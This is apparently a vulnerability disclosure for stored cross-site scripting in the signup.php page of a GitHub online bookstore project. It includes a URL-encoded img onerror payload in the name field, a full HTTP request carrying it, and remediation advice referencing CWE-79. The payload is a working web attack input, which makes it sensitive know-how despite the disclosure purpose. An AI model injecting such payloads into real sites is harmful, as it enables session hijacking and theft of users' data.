# keerti1924 / Online-Book-Store-Website - signup.php  Stored XSS

## Vendor Homepage:
[Online-Book-Store-Website](https://github.com/keerti1924/Online-Book-Store-Website)

## Impact
The 'signup.php' script in keerti1924's Online-Book-Store-Website is susceptible to Stored Cross-Site Scripting (XSS) attacks. This vulnerability allows attackers to inject malicious scripts into the application, potentially compromising the security and integrity of user data. Exploiting this flaw, an attacker could craft a payload, such as an image tag with an 'onerror' attribute containing JavaScript code, to execute arbitrary commands within the context of other users' browsers. This could lead to various malicious activities, including session hijacking, cookie theft, and the unauthorized access or manipulation of sensitive information.

## Proof of Concept
Step 1: Create a new account on the website.\
Step 2: Set the name parameter with the following payload: %3e%3cimg%20src%3dx%20onerror%3dalert('NoChizPlz')%3e.\
Step 3: Submit the registration form with the crafted payload.
Step 4: Upon successful login, an alert with the message 'NoChizPlz' will pop up, indicating successful execution of the XSS payload.

## HTTP Request Example
```http request
POST /signup.php HTTP/2
Host: [REDACTED]
Cookie: PHPSESSID=[REDACTED]
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

name=%3e%3cimg%20src%3dx%20onerror%3dalert('NoChizPlz')%3e&email=nochizplz3@nochizplz.com&password=Pa%24%24w0rd%21&password2=Pa%24%24w0rd%21&user_type=user&signup=
```

## Proof with screenshot
![Screenshot](https://github.com/skid-nochizplz/skid-nochizplz/blob/main/TrashBin/CVE/keerti1924%20Online-Book-Store-Website/StoredXSS%20Signup/Stored%20XSS%20signup.php%20Proof.png?raw=true)

## Remidiation
To address this vulnerability, developers should implement proper input validation and output encoding techniques to sanitize user-supplied data and prevent XSS attacks. Specifically, all user inputs, including form fields like the 'name' parameter in the signup form, should be validated and sanitized before being processed or stored in the database. Additionally, implementing a Content Security Policy (CSP) and regularly updating security libraries can help mitigate the risk of XSS vulnerabilities by restricting the execution of untrusted scripts and preventing unauthorized access to sensitive data.

## CWE
[CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
